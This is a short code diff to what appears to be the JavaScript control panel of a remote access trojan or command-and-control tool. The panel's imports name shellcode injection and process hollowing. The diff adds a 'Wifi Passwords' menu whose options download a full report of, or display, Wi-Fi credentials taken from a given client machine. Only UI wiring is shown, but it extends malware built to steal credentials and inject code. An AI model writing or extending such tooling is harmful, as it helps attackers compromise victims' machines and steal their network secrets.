@@ -6,7 +6,9 @@ import {
     SendInjectShellCodeLocal,
     UploadProcessToInject,
     HollowingOptionHandler,
-    sendMsgToFlsk
+    sendMsgToFlsk,
+    GetBaseWifiInfo,
+    GetFullWifiReport
 } from './OptionSettings.js';
   
 
@@ -262,7 +264,17 @@ function DisplaySettings(clientDiv, id) {
         },
         {
           name: "Wifi Passwords",
-          action: null 
+          action: null,
+          subOptions: [
+            {
+              name: "Download Full Report",
+              action: () => GetFullWifiReport(id)
+            },
+            {
+              name: "Display Info",
+              action: (e) => GetBaseWifiInfo(e, id)
+            }
+          ]
         }
       ]
     },
